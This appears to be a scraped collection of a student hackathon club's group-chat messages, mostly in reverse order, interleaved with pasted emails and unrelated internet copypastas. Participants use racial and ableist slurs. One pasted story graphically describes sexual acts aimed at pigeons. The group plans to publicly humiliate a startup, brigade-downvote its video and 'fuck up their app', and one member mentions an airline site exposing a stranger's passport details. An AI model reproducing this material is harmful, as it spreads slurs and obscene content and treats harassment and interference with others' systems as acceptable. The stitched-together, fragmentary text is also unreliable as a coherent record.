<p>Alright, tried again and now it has my details</p>
<p>LOL</p>
<p>Iberia just gave me someone's name, dob, passport number</p>
<p>uhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh</p>
<p>Yeah I can email em</p>
<p>All true</p>
<p>And they havent had any feedback or anything so they're in the dark</p>
<p>Yeah I know I'd be pissed</p>
<p>Maybe they felt like they did the best thing and got snubbed?</p>
<p>Ah you mean like tell them not to do that because it could get them in trouble</p>
<p>Sure, how did we ruin it though?</p>
<p>I feel like we should let em know what happened then. Cause otherwise we might have ruined hackathons for them. It might've been their first</p>
<p>it's just an old repo</p>
<p>and they nuked an old repo before the hackathon</p>
<p>Lol</p>
<p>but they're just retarded</p>
<p>we thought someone wrote hackbu code before hackbu</p>
<p>Tldr?</p>
<p>Got damn</p>
<p>checked for that, completely unrelated code</p>
<p>Didn't look at the repo that carefullly</p>
<p>question: is it possible they deleted everything then put it all back in?</p>
<p>relevant https://xkcd.com/1597/</p>
<p>I guess it's not too surprising, people generally just copy paste commands to do git</p>
<p>nice. thats more believable</p>
<p>fair enough lol</p>
<p>yep</p>
<p>🔥</p>
<p>?</p>
<p>so we concluded that they didn't cheat. They're just retarded</p>
<p>deal</p>
<p>On a lighter note, petition for Erik to make the album art his cover pic</p>
<p>Impressive</p>
<p>Alright so never tell anyone about this event :P</p>
<p>Nice detective work</p>
<p>And then made commits on top</p>
<p>They just didn't know how to make a new repo, so they copy-pasted the old folder over</p>
<p>Wow</p>
<p>yeah none of that actually made it into the final product</p>
<p>so probably not just git retards</p>
<p>https://github.com/danchintz/NBT/commit/e194e78aeaac7929a4e9b729912a539c30bdf3d9   yeah but this commit has the year 2016 written in it</p>
<p>He suspiciously mentioned that " I never finish projects all the way, [partner] finally got me to" or something to that effect</p>
<p>Jesus fucking christ this is beyond dumb</p>
<p>LOL</p>
<p>This commit seems to destroy everything that was before the hackathon</p>
<p>https://github.com/danchintz/Octocat-Simulator/commit/1c677c8c1ca2f8c34db6c66530ea8fe2bc015637</p>
<p>Did they fuck with the date or something</p>
<p>hold on, this might be just them being git retards</p>
<p>I've checked, there was a ton of code</p>
<p>Could we see what the repo was like before the hackathon and see how complete it looked?</p>
<p>https://github.com/danchintz/NBT</p>
<p>and we've verified that the code there wasn't just taken from online or copy-pasted? Like we know they wrote it themselves?</p>

<p>From HackBU's perspective, we spent months negotiating with companies who then paid thousands of dollars for the right to distribute swag and recruit students at our event. We would have been more than happy to work with any local start-up, especially one in your office, to get more involved in our event and recruit some quality tech talent. We feel a bit abused by this and are concerned how our sponsoring companies viewed this.</p>
<p>changed the last sentence of the last parahraph to:</p>
<p>articulated more nicely than that.</p>
<p>i'd add that we WOULD have been happy to set them up with something</p>
<p>fantastic</p>
<p>i think its veryy unlikely they'd lose their office for better or worse</p>
<p>agree with david, and wow pleasantly surprised at it overall</p>
<p>Any other thoughts?</p>
<p>changed</p>
<p>Personally, I think I should send it, Outt will get a slap on the wrist and all will blow over in a week</p>
<p>"The real purpose of the email" can be rephrased into we'd like to bring something to your attention</p>
<p>bear in mind, this may have significant impact on them. Depending on how E&amp;IP takes this, Outt may lose thier office in their suite and could potentially lose funding depending on how harshly E&amp;IP takes this</p>
<p>I attached the screenshot time posted in the memefree chat</p>
<p>Laura,

I wanted to bring some things to E&amp;IP's attention after our hackathon this weekend.

Firstly, the hackathon was a great success! We hit our goal of 300 people, we ordered near perfect amounts of swag / snacks, and received tons of (mostly) positive feedback on how to improve the event. I'm very excited to see this community and event grow for years to come. None of this could have been accomplished without the continued support from you and the rest of the E&amp;IP office, so thank you.

The real purpose of this email is to bring to light some events that transpired at the end of our event on Sunday. As hackers were leaving the event, the local start-up Outt (which is an E&amp;IP company, if I'm not mistaken) was handing out swag, flyers, trying to recruit our hackers, and actively promoting their company outside our event.

Attached below is Facebook post by Outt with HackBU's response to the post. The post has since been deleted.

From HackBU's perspective, we spent months negotiating with companies who then paid thousands of dollars for the right to distribute swag and recruit students at our event. For another company, who we had asked and were willing to work with on sponsorship, to come and do has this left us and our sponsoring companies feeling abused.

Just wanted to bring this to your attention - let me know if there is anything else you need from me.

Best,
Erik</p>
<p>Here's the thing I've drafted:</p>
<p>im on slightly different params right now</p>
<p>erik for your mental calculus, i realized i'm stressed about graph theory and that may be clouding my judgement</p>
<p>rekt</p>
<p>left on seen</p>
<p>kk</p>
<p>at least not yet</p>
<p>ok</p>
<p>I don't think we should respond</p>
<p>"Thank you for this explanation. This post leads us to believe you were among sponsors who had donated to be there but it sounds as though this might not have been the case. "</p>
<p>Fair enough</p>
<p>scavenging more than stealing.</p>
<p>Yeah they were saying something to me about applying online outside, but it was about an hour after the event</p>
<p>They knew they couldnt get into the event, they didnt try to cheat they just waited outside</p>
<p>Tim / Will, what do you think?</p>
<p>I'm drafting an email to Laura rn still</p>
<p>agreed to say the least. Erik what do you think.</p>
<p>Color me conflicted</p>
<p>While it is clever marketing on their part, it's unfair to our sponsors but then again they mostly wrapped up their recruiting activities when outt was doing this</p>
<p>i think that's fair. nowhere near the malice i assumed</p>
<p>I did hear them say they were looking for engineers when they were outside</p>
<p>and on the post claimed to have been literally trying to recruit</p>
<p>because they brought recruitment materials</p>
<p>which they likely are i just realized</p>
<p>Unless theyre lying</p>
<p>someone just took the picture?</p>
<p>they weren't inside trying to recruit?</p>
<p>God damn</p>
<p>chalk this up to a retarded social media person</p>
<p>david and i even mentioned at the time that we admired them being outside the event</p>
<p>didnt think i'd say this but i'm convinced</p>
<p>I just deleted the post from our page. I was unaware that our social media manager made that post until I saw the comment recently made from Hack BU. I apologize for that sincerely. On that note, we did not go into the event and try to recruit students at Hack BU in any way, nor did we claim to have an affiliation with Hack BU (excluding the innaproproate social media post made). We waited over an hour after the event had ended outside of the facilities and handed out fliers to the students whom remained. We believe that our presence outside the facility after the event had ended was not impeding on the event held by Hack BU, though again, I do apologize for the social media post made, which was just deleted. If you'd like, I'd be more than willing to meet with you in person to discuss the matter further. Looking forward to hearing back from you.</p>
<p>Erik I'd emphasize that we are more than happy to bend over backwards for people and that this was bona fide inappropriate</p>
<p>Great</p>
<p>email opened.</p>
<p>yes</p>
<p>i dont want to do anything (yet) but it's rails on aws if anyone cares</p>
<p>curious to see if they reactively message us first</p>
<p>my mitmproxy is broken because osx sucks ass, does anyone have the outt app</p>
<p>i still have the tab open in case we need pics or whatever</p>

<p>somewhere in my email</p>
<p>i can get a date if need be</p>
<p>talked to them in person</p>
<p>Jack, to what extent to you solicit them for sponsorship?</p>
<p>any publicity yadda yadda etc</p>
<p>good, we have shots w and w/o the comment</p>
<p>We can fuck them over pretty hard if we release a public statement</p>
<p>ill take care of the laura email</p>
<p>i'm not as close with laura holmes</p>
<p>ready to email the guy</p>
<p>We admire Outt but you did not sponsor or contribute to HackBU -  we are student run organization and taking advantage of someone else's event, hard work, and implying that you sponsored or were at all related to HackBU is not appreciated. We gave you a free workshop to hire and promote your platform. Even without the money to sponsor, making an appearance at the event to hire without so much as notifying us is beyond inappropriate. Our sponsoring companies pay thousands of dollars for the right to hand out swag and recruit students at this event. Not only did you abuse a free event that we host for the betterment of Binghamton University and its students, but you abused an organization that was willing to work with you to promote your company and help find talented students to hire.</p>

<p>Jack, wanna comment that?</p>
<p>HackBU is not affiliated with Outt and does not sanction any presence of Outt representatives at HackBU.  It was brought to our attention that several Outt representatives were handing out flyers to HackBU attendees, we were not informed that Outt representatives would be at the ITC. Outt did not sponsor nor consult with us at before taking these actions.</p>
<p>Slight revision to make it stronger:</p>
<p>/okay</p>
<p>We just need to make it very clear that we aren't affiliated with them at all and that what they did was not okay'd with us</p>
<p>comment*</p>
<p>yeah that might actually be a good post</p>
<p>i would yes.</p>
<p>Now THAT's what you post.</p>
<p>also, they are an entrepueurship and innovations company under laura, per, ect.  Should I email them and let them know what they did</p>
<p>YES</p>
<p>tim thats nicer but at that point it sounds too weak</p>

<p>We feel uncomfortable encouraging our members ...</p>
<p>is something like that too harsh?</p>
<p>'Because of your actions at our event, we will now discourage all of our members from participating in your company'</p>
<p>true</p>
<p>just say you not you guys</p>
<p>and agreed</p>
<p>Thats very well written</p>
<p>I want to end it with some reprocussions, but not sound threatening</p>
<p>Hello,

We admire Outt but you guys did not sponsor or contribute to HackBU -  we are student run organization and taking advantage of someone else's event, hard work, and implying that you sponsored or were at all related to HackBU is not appreciated. We gave you a free workshop to hire and promote your platform. Even without the money to sponsor, making an appearance at the event to hire without so much as notifying us is beyond inappropriate.

Not only did you abuse a free event that we host for the betterment of Binghamton University and its students, but you abused an organization that was willing to work with you to promote your company and help find talented students to hire.</p>
<p>We could go as far as to make an official statement</p>
<p>If I was a sponsor I'd be upset that some fuckers are coming in and trying to take away talent without paying anything</p>
<p>We gave you a free workshop to hire and promote your platform; even without the money to sponsor, making an appearance at the event to hire without so much as notifying us is beyond inappropriate. We rely on sponsorship, good will and cooperation to make our massive events that benefit Binghamton work.</p>
<p>this is the core of what we're trying to communicate i think</p>
<p>yea p sure</p>
<p>isn't it??</p>
<p>a fucking fb messenger screenshot</p>
<p>will, can we fuck up their app</p>
<p>this is</p>
<p>https://www.outt.com/assets/iPhone_screenshots2-b0667d1572f293883d18952cff87b75fb4b42ca1cf0f954109b44eb0a5d7be36.png</p>
<p>or i could email the guy i know personaly.</p>
<p>with the nice ending</p>
<p>Erik, can i message this please</p>
<p>https://www.youtube.com/watch?v=vLfQh5fTIWw everyone go downvote this video</p>
<p>personally im sure we could have given them some sort of partner tier</p>
<p>and the backhanded natute of it. why the hell didnt they just ask nicely</p>
<p>that was the right decision</p>
<p>we turned down terela making so much as a presentation for free for the comapny he was working for senior year</p>
<p>that makes me furious</p>
<p>yes exactly</p>
<p>We rely on sponsorship, good will and cooperation to make our massive events that benefit Binghamton work.</p>
<p>adding</p>
<p>But they came to an event that sponsors pay thousands of dollars for the right to hand out swag</p>
<p>people respond very poorly to those</p>
<p>yeah. i'd say dont give any demands</p>
<p>eggs</p>
<p>and these guys have massive egos</p>
<p>We just want them to feel bad</p>
<p>we have little formal ground unfortunately</p>
<p>do we want them to change it?</p>
<p>do we want them to take it down?</p>
<p>do we just want to tell them we are angry and don't appreciate it?</p>
<p>but what are we trying to say exactly?</p>
<p>lol that ? should've been a ! lol</p>
<p>erik what were you gonna say</p>
<p>actually nvm</p>
<p>appending;</p>
<p>ooo Will, nice bating on that comment? lol</p>
<p>Hello,

We admire Outt but you guys did not sponsor or contribute to HackBU -  we are student run and taking advantage of someone else's event and implying that you sponsored or were at all related to HackBU is not appreciated. We gave you a free workshop to hire and promote your platform. Even without the money to sponsor, making an appearance at the event to hire without so much as notifying us is beyond inappropriate.</p>
<p>Should we say something like 'We would appreciate it if you took down / changed the post to make it less misleading'</p>
<p>Reworded Jack's thing to: "We admire you guys but did not sponsor or contribute to HackBU -  we are student run event and taking advantage of someone else's event is not appreciated."</p>
<p>pls</p>
<p>as hackbu</p>
<p>can i at least angry react it</p>
<p>i wish the pulse shirt guy was in the pic</p>
<p>alright i'm on it.</p>
<p>yeah dm those fuckers</p>
<p>yeaaa true</p>
<p>public hhumiliation though</p>
<p>lol</p>
<p>yes</p>
<p>ugh voice of reason.</p>
<p>what it be better if we messaged them?</p>
<p>how does one articulate that they freeloaded (specifically declined sponsoring, i've asked them)</p>
<p>totally misleading</p>
<p>at least on the stairs</p>
<p>and from the picture it looks like they were</p>
<p>they just said they were there</p>
<p>but they didn't necessarily say they sponsored us</p>
<p>Fucking do it</p>
<p>oh i thought yuo meant from personal accounts</p>
<p>"We admire outt but you guys did not sponsor or contribute to HackBU -  we are student run and taking advantage of someone else's event is not appreciated</p>
<p>yeah</p>
<p>from the hackbu account</p>
<p>Die you snake ass bitches</p>

<p>i'll comment</p>
<p>call them out</p>

<p>Tim where are you</p>
<p>I saw Chris Beard at a grocery store in the upper East side yesterday. I told him how cool it was to meet him in person, but I didn’t want to be a douche and bother him and ask him for photos or anything.

He said, “Oh, like you’re doing now?”

I was taken aback, and all I could say was “Huh?” but he kept cutting me off and going “huh? huh? huh?” and closing his hand shut in front of my face. I walked away and continued with my shopping, and I heard him chuckle as I walked off. When I came to pay for my stuff up front I saw him trying to walk out the doors with like fifteen Milky Ways in his hands without paying. The girl at the counter was very nice about it and professional, and was like “Sir, you need to pay for those first.” At first he kept pretending to be tired and not hear her, but eventually turned back around and brought them to the counter. When she took one of the bars and started scanning it multiple times, he stopped her and told her to scan them each individually “to prevent any electrical infetterence,” and then turned around and winked at me. I don’t even think that’s a word. After she scanned each bar and put them in a bag and started to say the price, he kept interrupting her by yawning really loudly.</p>
<p>Oh haha I'm 12 btw</p>

I used to masturbate onto birds at a local park. Not a thing that I'm particularly proud of but I became quite good at it. I was taking zinc supplements so I was shooting massive loads and it became something of a sport to me. For anyone interested here is your best strategy. first, you need to find an isolated spot so you don't become a sex offender. I found a short kind of channel area where I saw the pigeons would congregate. Next, you arouse yourself. I was usually content with envisioning the occasional jogging lady coming over and taking a shit on my chest and that was enough to fuel the fire but if you're not as sexually charged as me just take some porn on the go. After you're good an horny, you get some bread. My pigeons preferred white bread but healthier birds might have a taste for honey wheat or maybe even multigrain. Fat, unhealthy birds are slower and easier to hit so remember that. Once you are seated on the bench and ready to do the deed, whip your roosevelt out and scatter bread out within a few feet of you. use your judgement based on how far you know you can cum. I was a lonely and depraved soul who could hit targets the size of a thimble at distances up to 4 feet. You wait for the pigeons to begin eating and to get comfortable with your presence. At this point, you want to coo gently and talk sensually to them to gain their trust. Now you're finally ready to cum on your bird. This is a tough part because the rapid motion of masturbation is very frightening to the birds, so you have to be subtle. Once you master a technique, you simply wind it up and let it go, aiming depending on your past cumming experiences. I always came high so I would aim for the neck of the bird and catch it right in the face. It's an extremely satisfying and erotic feeling, seeing those birds reel around covered in cum and maybe even transporting it to other places in the city. Either way I haven't done it in years but every now and then I catch myself gazing wistfully at a flock of birds, cock throbbing and waiting for them to land close to me.  But now that I've made dean's list, those days are over.

<p>cause k = inf</p>
<p>everyone knows you cant do clustering on genders</p>

<p>unrelated - i was very triggered by zheng's clustering analysis on genders where k=2</p>
<p>dont make us feel bad tho thats not fair</p>

Thank you for your response and that opportunity with HackBU sounds great.  I have received one response and hopefully I will receive more.  If you know anyone interested please feel free to give them my contact information.  Is there any other way to promote my opening around campus?

<p>Bring your chin down to protect your neck while continuing to stare into his eyes. Bring up your hands and say "I don't want no trouble ya hear". Flex your traps and core. Slightly bend your knees.
Here comes the important part. In a low voice begin to say "wolowolowolowolowolo" slowly increasing in volume, he should be surprised by now. Begin to sway side to side and loosen all facial muscles and your anal sphincter and your kegal muscle. Expose your inadequate penis. By now you should be pretty loud and your opponent will have stepped back and will appear visibly shaken.
Begin to piss and shit yourself and let your eyes roll into the back of your head. By now you are chanting "WOLOWOLOWOLOWOLO" at the top of your lungs.
He will run away. Everyone within a one mile radius will feel a terrifying presence within their soul.</p>

Hi everybody,

I have been receiving a lot of emails from students explaining their reasons for not being able to commit projects to bitbucket. As you all know the only way we track your progress with the projects is by keeping a track on your commits in the repository. 

We might consider your 2048 project (if there is a genuine issue), but no more git related issues will be entertained. You have 2 more days to submit the next project and please make sure you get the issues sorted.

The reason for this is there are a lot of students who have been committing their work to the repository regularly and sticking to timelines. It would be unfair on our part to ease out on those who don't follow the guidelines. Hope you understand and make sure we don't come across such issues anymore.

Have a great weekend!

Cheers,

Sravan.</p>

<p>oh ok that makes sense then</p>
<p>I used his library and I ran into that bug</p>
<p>Because he wasted my time at brickhack</p>

<p>arun11299 I hope you step on a lego</p>
<p>anyways, I fixed it and now my brickhack code magically works</p>
<p>c++ has magic vectors, c doesn't</p>
<p>with whatever you write</p>
<p>with his or cstdio</p>
<p>nah you need to read in chunks</p>
<p>https://github.com/arun11299/cpp-subprocess/blob/master/subprocess.hpp#L310</p>
<p>uhh doesnt cstdio literally have library buffered reading that does that</p>
<p>Always a std::vector&lt;char&gt;</p>
<p>It's literally never a Buffer class</p>
<p>also the comment about the class being of type Buffer is flat out wrong</p>
<p>read at most n my ass</p>
<p>look at this fucking trash code</p>
<p>https://github.com/arun11299/cpp-subprocess/blob/master/subprocess.hpp#L274</p>
<p>gotcha. so when something is evicted from l1 does it always go to l2?</p>
<p>it'll use marbles</p>
<p>and half the processing power</p>
<p>it'll use half the space</p>
<p>guys i'im going to make a base 1 computer and become famous</p>
<p>cache space is v expensive</p>
<p>nyet</p>
<p>i assume no</p>
<p>if something is in L1 cache is it also in L2</p>

Dear Erik,

I am working on an indoor mapping project that has a MongoDB component, but I have no experience with that software. 

Are you able to refer me to anyone with MongoDB experience within HackBU or the CS dept?

Best regards,</p>
<p>this is serious</p>

<p>Wait so we have to do hecks on this too, right?</p>
<p>LOL</p>
<p>OK, so I have learned that my problem the first time around was probably that I created a 'public' playlist that allowed some nefarious 'bot' to sabotage it. 
Not to be deterred, I am trying again. Here is a new playlist that only we who have the following link can see and add songs to:
https://[REDACTED]
If you already added songs to the old playlist, no need to re-add them: I transferred them over. But if you have any new songs you'd like to share, we're all ears.</p>

<p>Snowy fun fun time!!</p>
<p>Look at that link again everyone. WIll be talking about it tomorrow at hackbu</p>
<p>Hello, everyone.

I mentioned in class yesterday that it might be interesting to have some music to play before class starts and during break. With help from some of you, I think I have figured out a way to accomplish this via the interwebs. If I understand things correctly, I have created a YouTube playlist and made it so that any of you can contribute songs to it via the following link:

https://www.youtube.com/playlist?list=PL_ORwE112UYy6XXwFXErPSEZQJieK4tRM&amp;jct=p2wlBh7AMenfx7uwq7Tljk5BdyzKCg

And remember, the idea is to have music that relates in some way or other to the course....

-- CMK</p>
<p>will's philosopher prof plays it in class</p>
<p>go nuts add stuff to this</p>

<p>They probably pronounce it wrong</p>
<p>fucking nerds</p>
<p>harvard has a valentines day rave party called "ValGrind"</p>
<p>go all the way left, then pop up and go right</p>
<p>or just do an in-order traversal and count</p>
<p>well then you can return any one of them</p>
<p>im onto something</p>
<p>wait</p>
<p>the thing doesn't specify</p>
<p>uhhhhhhh</p>
<p>What order</p>
<p>dont tell nasa pls</p>
<p>im totally stumped</p>
<p>'Find the n-th node in a binary tree</p>
<p>okay so turns out I forgot how to binary tree</p>
<p>it's fake aiden</p>
<p>He's still complaining about the kick from this group</p>
<p>whatd h get kickd from this time</p>
<p>ew</p>
<p>Reference counting</p>
<p>Yes</p>
<p>they only do java and lisp shit here</p>
<p>with the python gc handle it?</p>
<p>wait so what do ?</p>
<p>lmao</p>
<p>what kind of shit python are they teaching at Southwestern</p>
<p>Derek is feeding you bad ideas</p>
<p>Don't call it</p>
<p>lolol</p>
<p>I guess this is what happens when AFRL gives you 256Gb RAM, amirite Jack?</p>
<p>how did I not know this lol</p>
<p>wait are you serious</p>
<p>del variable_here</p>
<p>del</p>
<p>And I suppose so, But this might a python thing cause I'm deleting like 100s of nodes in Y. Does python have a manual 'delete'?</p>
<p>Hello I am delete</p>
<p>deleteFunction * obv don't want to delete only root of X</p>
<p>your*</p>
<p>so save X's address and insert new leaf where X was, then call you're delete on X. I think that would work</p>
<p>isn't it just postorder traversal to delete Y?</p>
<p>so you're asking best way to free all the nodes in Y?</p>
<p>Y is removed from the tree</p>
<p>Do you want to save Y? or are you deleting it now?</p>
<p>Replace X with a leaf</p>
<p>or adding a leaf to x</p>
<p>do you mean you replace X with a leaf node?</p>
<p>Say I have a tree that has a subtree at node X that has a subtree of Y nodes. If I was to place a leaf node at node X, what is the proper way to handle the subtree Y</p>
<p>This might be a silly question for the leet haxors out there but</p>

<p>gaiz superbowl party at my house</p>
<p>I bet I can get a lot for that</p>
<p>Or my left kidney</p>
<p>I could sell my lapotop and buy a pixel</p>
<p>Well you could say the same thing about selling anything</p>
<p>Ezpz</p>
<p>And then it's not 700</p>
<p>Will sell your 6p</p>
<p>It took me two months to finally buy it after deciding</p>
<p>I'm too poor to drop $700 without internal conflict</p>
<p>I just wish the Nexus style prices were still around :(</p>
<p>I like small phones</p>
<p>But otherwise go big or go home</p>
<p>And that if your pockets are a bit small then feelsbadman</p>
<p>The only gripe I have is it's mildly hard to type one handed</p>
<p>Tbh</p>
<p>Big is kind of nice</p>
<p>I'm afraid the non XL will be too small coming from a 6p</p>
<p>XL?</p>

<p>No you sound like you like a clean apartment</p>

<p>Even though they clean constantly, so they're not the one making the mess</p>

<p>There's also hardware based wallets which you can buy that are a little safer because they don't run on windows</p>
<p>You can also buy bitcoins on exchanges in pretty small increments</p>
<p>So with the same software you can have fractions of a cent or millions of dollars stored</p>
<p>You can divide a bitcoin down to 8 decimal places</p>
<p>You can't do like half a Bitcoin like that though right?</p>

<p>Patterns for program design including examples of patterns used in existing software libraries. Exercises in programming with design patterns and communicating designs to other programmers using the language of patterns. Use of an object-oriented programming language to implement patterns and principles for common design problems. CS 442 is a number change for the course previously offered as CS 342.

<p>I really want to drop a gened class, but I have to replace it with either PL or a CS elective</p>
<p>Yao Liu and Anand Seetharam</p>
<p>I took it last semester with Yan Wang and it was the worst educational experience of my life</p>
<p>Depends who's teaching it</p>
<p>Is networks a good cs elective?</p>
<p>I'm ready to trigger some chinks</p>
<p>Anything you can write in c you can write in obj c</p>
<p>madden thinks it's a fantastic language</p>
<p>fucking</p>
<p>Obj c isn't so bad</p>
<p>what is this language omg</p>
<p>hackerproofing</p>
<p>wtf is this shit
```
NSArray *array = @[@[@"0:0", @"0:1"],
                   @[@"1:0", @"1:1"]];

NSString *value = array[1][0];
```</p>
<p>this is different and weird and new so it's bad</p>
<p>gives you the length</p>
<p>[nameOfArr count]</p>
<p>it's weird fucking syntax</p>
<p>nvm you can get the size of an array</p>
<p>those are pretty gross looking</p>
<p>has ken shown you the canonical if-safe macros?</p>
<p>nevermind you can</p>
<p>that's nice for macros</p>
<p>without the brackets</p>
<p>can't do one line if statements</p>
<p>this is garbage</p>
<p>it's C with objects</p>
<p>yeah but this isn't C</p>
<p>same thing applies to c...</p>
<p>what trash</p>
<p>you have to

``` Objective C
sz = (sizeof foo) / (sizeof foo[0]);
```</p>
<p>obj c arrays don't have an inherent size variable</p>
<p>wtf</p>
<p>lolol im sure the prof would have no problem</p>
<p>you can just python -c shit all day no problem</p>
<p>fork a python interpreter</p>

<p>gl;hf deque is the weed out assignment</p>
<p>uhhhhhh ok</p>
<p>But you have to first define them, with the deque define macro</p>
<p>it just invokes the macro with a datatype</p>
<p>Deque_int, Deque_MyClass</p>
<p>how does the prefix thing work</p>
<p>Just wait until map</p>
<p>his test.cpp is nice</p>
<p>"Your code should be in one file, Deque.hpp. "</p>
<p>Use IDLE</p>
<p>that's why you should use eclipse</p>

<p>Just let children get exemption cards that certify that they're not going to be assholes on an airplane. I'll happily sit next to a well traveled and calm child.</p>
<p>People like to say it's baby bigotry or whatever, but if an adult started screaming and crying they'd be thrown off the plane instantly. Same if they constantly disturb the person next to them or in front.</p>
<p>I'm traumatized no joke</p>
<p>The fucking guy even changed his child's diaper in the seat</p>

<p>Vim 8 won't even be available until 17.04</p>

<p>no I didn't ask</p>
<p>did you even ask them</p>
<p>did bbg get back to you</p>
<p>go write a blog about it</p>
<p>why are t here a million apps</p>
<p>I should just SMS with FB messenger</p>
<p>Liiiiit</p>
<p>Use the phone app?</p>
<p>but not if you want it to use minutes</p>
<p>Hangouts for all</p>
<p>Nah</p>
<p>is it allo?</p>
<p>Yeah</p>
<p>wait really?</p>
<p>Sigh</p>
<p>Yep</p>
<p>that would be too easy</p>
<p>Is it possible to use only one of the Android messaging apps?</p>
<p>yeah don't use hangout dialer if you want it to use minutes</p>
<p>I think if I use my regular dialer it might work</p>
<p>you can have it call through your minutes</p>
<p>I just wish I didn't need data to make a call with it</p>
<p>I second that</p>
<p>messaging with hangouts it's so nice</p>
<p>They r gud</p>
<p>gmail labels r godsend</p>
<p>I love when banks don't let you put spaces in your password</p>
<p>Who is litttttttt</p>

<p>there's literally no reason they'd be in my apartment over anyone else's</p>
<p>Could be there as just more of an incentive for you to keep extremely clean</p>
<p>Huh I feel like for big buildings in NYC it'd be mad expensive to do cause usually they wouldn't be just in your apartment</p>
<p>It's pretty common from what I've heard</p>
<p>Wow that's ass</p>
<p>You live on the edge</p>
<p>Not pay for bugs to die</p>
<p>I need to be a millionaire</p>

<p>Because after 70k you can't deduct traditional IRA contributions of you participate in employer savings</p>
<p>Basically Roth IRA is the only way</p>
<p>So I'm back</p>
<p>But moved to churning</p>
<p>Decided I dont</p>
<p>Thought I knew it all</p>
<p>The retirement stuff for me has only gotten dank v recently</p>

<p>Guess not</p>
<p>Crass I thought the focus on retirement was a senior year phase</p>
<p>oh huh</p>
<p>not the other way</p>
<p>you can only go traditional -&gt; roth</p>
<p>oh nice, how hard is it to switch from roth to regular</p>
<p>but only because of standard deduction</p>
<p>but in 15% bracket</p>
<p>I might be able to make a roth ira contribution</p>

<p>monday media be like</p>
<p>4.0 my ass</p>
<p>"I'll never forget the yelling my parents did, when they expressed how disappointed they were in me, that I could do so much better."</p>
<p>can you imagine the race war tho</p>
<p>maybe this is just another story like clock kid</p>
<p>I bet she never even talked to her aid advisor</p>
<p>so i'ma need 'bout tree-fiddy for college "tuition"</p>
<p>but more likely, she had no actual savings</p>
<p>If she had a utma or anything like that she could have it ez</p>
<p>If she didn't earn the money with a job maybe it's legal</p>
<p>YiKeSsSs</p>
<p>i'll jump on it ;)</p>
<p>They can order parents to pay for her housing and shit</p>
<p>This kind of sob story is something any lawyer will jump on for free</p>
<p>LAWYER UP BOI</p>
<p>how is that legal</p>
<p>Hold up, she said stripped of personal savings</p>

<p>its clearly not a school function then u perk farmer</p>
<p>the school ain't catholic you whitey tighty</p>
<p>Oh man A+</p>
<p>the church has catholic stained glass u ignorant fuk</p>
<p>Who doesn't want to buy moral superiority</p>
<p>that's impressive</p>
<p>she has an average donation of &gt;$25/person</p>
<p>!!!</p>
<p>don't assume it's catholic you racist bigot of a  human, jack</p>
<p>Oh yeah girl with no income and not a dependent get bank from the feds</p>
<p>this is her school</p>
<p>https://en.wikipedia.org/wiki/Hutchison_School</p>
<p>Too excited</p>
<p>Give me 60 seconds</p>
<p>Meme coming</p>
<p>Also federal loans are a thing</p>
<p>Bamboozled again!</p>
<p>I give it till tomorrow and everyone involved is getting death threats</p>
<p>Well clearly they're inseperable</p>
<p>And would you really want to give a loan to your sons potentially basic GF</p>
<p>Outside a church? Private school probably = catholic in this context, maybe it's a school function.</p>
<p>Also ez money</p>
<p>What if they don't have money</p>
<p>True</p>
<p>Why doesn't she get a loan from her boyfreind's family?</p>
<p>there are two people holding papers in the picture</p>
<p>could absolutely be a benefit</p>
<p>she said she volunteers</p>
<p>And they're white, so it's not HIS family</p>
<p>Why are they at a (probably family) adult function dressed nicely</p>
<p>If her parents hate her</p>
<p>Ez money</p>

<p>just being an economist :|</p>
<p>Wtf will</p>
<p>though, if you make sure the kid comes out disabled, you can get a much bigger credit</p>
<p>https://en.wikipedia.org/wiki/Cost_of_raising_a_child</p>
<p>Unfortunately it doesn't scale well, the child care deduction ends at $6k</p>
<p>If you can keep a kid around for under $4k a year, they're financially beneficial</p>
<p>yee</p>
<p>that makes sense</p>
<p>oh so the negative tax dealio will is because of deductions</p>
<p>Youd be able to retire at like 50</p>
<p>that would be  so dank</p>
<p>I wish I could get like 30k/yr in employer match for 401k</p>
<p>ohh</p>
<p>Tim added some Facebook rando</p>
<p>not sure wat happenin</p>
<p>yeah it's wak</p>
<p>this seems out of order</p>
<p>so I can't obsess over it</p>
<p>but bloomberg's 401k thing is down for maintenance</p>
<p>I think traditional will work</p>
<p>wat</p>
<p>Jack fischer the astronaut will hopefully only be around for a couple more years</p>
<p>Welcome, Jack Fischer</p>
<p>Make visualizations of random things and snail mail them to people</p>
<p>what would I do with it</p>
<p>in other news, what if I rand a company and basically had all of the data on people all over the world</p>
<p>a mic drop?</p>
<p>yeah, but is that the effect you're going for Jack?</p>
<p>this is like the 3rd time I've done it</p>
<p>nah it's pretty easy to just add him back</p>
<p>because that's pretty lit</p>
<p>so is JJ's leaving supposed to be taken as a mic drop?</p>
<p>necessity is the mother of invention</p>
<p>By itai Ferber</p>
<p>toilet paper was invented in nyc in the 1850s</p>
<p>I suppose that makes most sense if she's coming to Binghamton University</p>
<p>Binghamton mayor?</p>
<p>Mmmmmm</p>
<p>I stand by waht I said</p>
<p>I'm not insane</p>
<p>Not actual hackbu</p>
<p>Nah, workshop workshop</p>
<p>which means it'll probably fall into lower brackets</p>
<p>your distributions from your 401k will start filling up tax brackets on top of your ss</p>
<p>if the marginal rate is lower, then roth seems better but it's just the marginal dollar you can shift   between your trad/roth 401k</p>
<p>if your marginal tax rate is the same, they're identical to you</p>
<p>not really</p>
<p>You get fucked over at withdrawal time</p>
<p>based on how your taxes are applied to distributions</p>
<p>Idk boys it looks like traditional contributions make a lot of sense</p>
<p>just like sleepless caffeinated me in school</p>
<p>lol</p>
<p>and ya crass it was one of those days</p>
<p>ya never please</p>
<p>aka she's not speaking at hackbu</p>
<p>Girl running for mayor might talk at hackbu to recruit a Bernie sanders style army</p>
<p>This is trash. YouTube red gets disabled when you leave America</p>
<p>Oololol</p>
<p>He was asking if I was going to be at hackathons</p>
<p>Guys Alex messaged me probably like 5 times before I could understand what he was asking</p>
<p>Yikes</p>
<p>Uh</p>
<p>Wanted to see that</p>
<p>Awh</p>

<p>It's just a thing</p>
<p>How do I know?</p>
<p>Who else is a dank lord</p>
<p>I'm a dank lord</p>

<p>Ah yeah true</p>
<p>It's just like sales tax</p>
<p>If you charged tax on rent, it would be passed directly onto the tenant</p>
<p>Damn that's nuts</p>
<p>OSHIT</p>
<p>and I was like</p>
<p>I remember seeing somewhere that rental income doesn't count as taxable income somehow</p>
<p>moguls*</p>
<p>Real estate mogules pay basically nothing in federal tax</p>
<p>If you're trump though, you can start claiming depreciation like crazy</p>
<p>looks like you can bank roll that</p>
